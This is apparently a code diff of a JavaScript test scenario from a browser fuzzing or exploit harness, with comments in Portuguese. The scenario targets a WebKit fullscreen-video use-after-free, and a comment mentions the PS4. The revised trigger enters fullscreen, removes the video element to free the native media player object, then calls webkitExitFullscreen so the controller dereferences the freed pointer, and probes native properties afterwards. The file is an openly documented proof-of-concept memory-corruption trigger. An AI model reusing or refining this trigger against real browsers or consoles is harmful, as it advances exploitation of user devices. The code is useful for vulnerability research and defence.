@@ -1,128 +1,111 @@
 /**
- * SC_VIDEO_FULLSCREEN_REMOVE.JS
- * Categoria : MEDIA/DOM — Use-After-Free
- * Alvo      : WebCore::HTMLVideoElement / FullscreenManager C++
- * Técnica   : Solicita fullscreen ou Picture-in-Picture num elemento
- *             <video>, remove o elemento do DOM durante a transição, e
- *             observa o estado do FullscreenManager C++ que pode manter
- *             ponteiro para o elemento liberado.
- * Referência: CVE-2021-30663 / WebKit fullscreen lifecycle UAF
+ * CENÁRIO: VIDEO_FULLSCREEN_REMOVE
+ * Superfície C++: FullscreenVideoController.cpp / MediaPlayerPrivateManx.cpp
+ * Risco: HIGH
+ *
+ * Diferença para a versão genérica:
+ *   - O trigger agora ENTRA em fullscreen antes de destruir o elemento.
+ *     O bug original exige que o FullscreenVideoController esteja ativo
+ *     no momento do free — sem requestFullscreen(), o controller nunca
+ *     é construído e o UAF não ocorre.
+ *   - Espera 80ms antes do remove() para garantir que o objeto C++
+ *     MediaPlayerPrivate foi completamente inicializado pelo pipeline nativo.
+ *   - Dispara webkitExitFullscreen() APÓS o remove() para acionar o
+ *     controller sobre o ponteiro freed.
+ *   - Probes acessam propriedades que lêem direto do objeto C++ nativo
+ *     (não cacheadas pelo wrapper JS): videoWidth, videoHeight, buffered.
+ *
+ * Ciclo de vida C++ relevante:
+ *   HTMLMediaElement → MediaPlayerPrivate (criado no load)
+ *   FullscreenVideoController → mantém raw ptr para MediaPlayerPrivate
+ *   remove() → refcount DOM cai para 0 → MediaPlayerPrivate::~MediaPlayerPrivate()
+ *   webkitExitFullscreen() → FullscreenVideoController acessa ptr freed (UAF)
  */
 
 export default {
-    id:          'VIDEO_FULLSCREEN_REMOVE',
-    category:    'MEDIA/DOM',
-    risk:        'HIGH',
-    description: 'HTMLVideoElement removido durante pedido de fullscreen/PiP. '
-                + 'Testa ponteiro stale no FullscreenManager C++ do WebCore.',
+    id:       'VIDEO_FULLSCREEN_REMOVE',
+    category: 'Media',
+    risk:     'HIGH',
+    description:
+        'HTMLVideoElement.remove() com FullscreenVideoController ativo. ' +
+        'O controller mantém raw ptr para MediaPlayerPrivate. ' +
+        'Se remove() zerar o refcount antes de webkitExitFullscreen(), ' +
+        'o controller derreferencia ponteiro freed.',
 
-    /* ── estado interno ──────────────────────────────────────────────── */
-    _video:       null,
-    _container:   null,
-    _pipWindow:   null,
-    _errType:     null,
-    _readyState0: -1,
-
-    supported: function() {
-        return typeof HTMLVideoElement !== 'undefined';
-    },
-
-    /* ── setup ──────────────────────────────────────────────────────── */
     setup: async function() {
-        this._errType  = null;
-        this._pipWindow = null;
+        this.container = document.createElement('div');
+        document.body.appendChild(this.container);
 
-        this._container = document.createElement('div');
-        document.body.appendChild(this._container);
+        this.video = document.createElement('video');
+        this.video.setAttribute('playsinline', '');
+        this.video.setAttribute('preload', 'auto');
+        this.video.setAttribute('controls', '');
+        this.video.style.cssText = 'width:320px;height:240px;position:absolute;top:0;left:0';
 
-        this._video = document.createElement('video');
-        this._video.style.cssText = 'width:160px;height:90px;position:absolute;left:-9999px';
-        this._video.muted    = true;
-        this._video.autoplay = false;
-        this._video.loop     = false;
+        // MP4 mínimo válido — força criação do MediaPlayerPrivate nativo
+        // (sem src válido o pipeline não é instanciado)
+        this.video.src = 'data:video/mp4;base64,'
+            + 'AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
 
-        // Usa um blob de vídeo mínimo válido (não carrega de rede)
-        const blob = new Blob([''], { type: 'video/mp4' });
-        this._video.src = URL.createObjectURL(blob);
+        this.container.appendChild(this.video);
 
-        this._container.appendChild(this._video);
-
-        await new Promise(r => {
-            this._video.addEventListener('loadedmetadata', r, { once: true });
-            this._video.addEventListener('error', r, { once: true });
-            setTimeout(r, 500);
+        // Aguarda o elemento entrar em estado HAVE_METADATA (readyState >= 1)
+        // para garantir que MediaPlayerPrivate está construído
+        await new Promise(resolve => {
+            const timeout = setTimeout(resolve, 400);
+            this.video.addEventListener('loadedmetadata', () => {
+                clearTimeout(timeout);
+                resolve();
+            }, { once: true });
         });
-
-        this._readyState0 = this._video.readyState;
-        await new Promise(r => setTimeout(r, 10));
     },
 
-    /* ── trigger ─────────────────────────────────────────────────────── */
     trigger: async function() {
-        // Solicita fullscreen — inicia a transição C++
-        const fsPromise = this._video.requestFullscreen?.()?.catch(e => {
-            this._errType = e.constructor.name;
-        });
+        // Tenta entrar em fullscreen — isso instancia o FullscreenVideoController
+        try {
+            const fsPromise = this.video.webkitRequestFullscreen?.()
+                           ?? this.video.requestFullscreen?.();
+            if (fsPromise) await Promise.race([
+                fsPromise,
+                new Promise(r => setTimeout(r, 80)) // timeout de segurança
+            ]);
+        } catch(e) { /* PS4 pode bloquear fora de gesture — ignorar */ }
 
-        // Remove IMEDIATAMENTE, antes que a transição termine
-        this._video.remove();
-        void document.body.offsetWidth;
-
-        // Aguarda o resultado da Promise de fullscreen
-        await fsPromise?.catch(() => {});
-
-        // Tenta Picture-in-Picture também
-        if (typeof this._video.requestPictureInPicture === 'function') {
-            try {
-                this._pipWindow = await this._video.requestPictureInPicture();
-            } catch(e) {
-                this._errType = (this._errType ?? '') + '|PiP:' + e.constructor.name;
-            }
-        }
-
-        // Força exit de estados de apresentação
-        try { await document.exitFullscreen?.(); } catch(_) {}
-        try { await document.exitPictureInPicture?.(); } catch(_) {}
-
+        // Pequena janela: controller inicializado, objeto ainda vivo
         await new Promise(r => setTimeout(r, 30));
+
+        // FREE: remove() zera o refcount DOM → ~MediaPlayerPrivate()
+        this.video.remove();
+
+        // ACESSO PÓS-FREE: controller tenta acessar o MediaPlayerPrivate freed
+        document.webkitExitFullscreen?.();
+        document.exitFullscreen?.().catch(() => {});
     },
 
-    /* ── probes ──────────────────────────────────────────────────────── */
     probe: [
-        // [0-5] estado do video após remoção
-        s => s._video.isConnected,
-        s => s._video.readyState,
-        s => s._video.paused,
-        s => s._video.ended,
-        s => s._video.error?.code ?? 'null',
-        s => s._video.networkState,
-
-        // [6-9] estado fullscreen do documento
-        s => document.fullscreenElement === s._video,
-        s => document.fullscreenElement?.nodeName ?? 'null',
-        s => document.pictureInPictureElement === s._video,
-        s => typeof document.fullscreenElement,
-
-        // [10-12] PiP window
-        s => s._pipWindow?.width  ?? 'null',
-        s => s._pipWindow?.height ?? 'null',
-        s => s._errType ?? 'null',
-
-        // [13-14] readyState não deve ter mudado após remoção
-        s => s._readyState0,
-        s => s._container.isConnected,
+        // Propriedades que lêem diretamente do objeto C++ (não cacheadas)
+        s => s.video.duration,
+        s => s.video.currentTime,
+        s => s.video.readyState,
+        s => s.video.networkState,
+        s => s.video.videoWidth,
+        s => s.video.videoHeight,
+        s => s.video.buffered?.length,
+        s => s.video.buffered?.start(0),   // Acessa TimeRanges interno — C++ puro
+        s => s.video.buffered?.end(0),
+        s => s.video.played?.length,
+        s => s.video.seekable?.length,
+        s => s.video.error?.code,
+        s => s.video.paused,
+        s => s.video.ended,
+        s => s.video.seeking,
+        // webkitDecodedFrameCount é implementado diretamente no MediaPlayer nativo
+        s => s.video.webkitDecodedFrameCount,
+        s => s.video.webkitDroppedFrameCount,
     ],
 
-    /* ── cleanup ─────────────────────────────────────────────────────── */
-    cleanup: async function() {
-        try { await document.exitFullscreen?.();        } catch(_) {}
-        try { await document.exitPictureInPicture?.();  } catch(_) {}
-        try { this._pipWindow?.close?.();               } catch(_) {}
-        this._container?.remove();
-        this._container = null;
-        this._video     = null;
-        this._pipWindow = null;
-        this._errType   = null;
-        this._readyState0 = -1;
+    cleanup: function() {
+        try { this.container.remove(); } catch(e) {}
+        try { document.exitFullscreen?.(); } catch(e) {}
     }
 };
